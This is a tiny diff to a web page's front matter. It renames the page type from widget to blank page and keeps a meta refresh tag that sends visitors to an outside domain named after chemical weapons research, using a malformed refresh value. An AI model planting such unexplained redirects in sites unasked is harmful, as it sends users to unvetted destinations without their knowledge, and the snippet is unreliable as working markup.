@@ -1,5 +1,5 @@
 ---
-type: widget_page
+type: blank_page
 ---
 
 <meta http-equiv="refresh" content="time; URL=https://thermalfogger.chemicalweaponsresearch.com" />
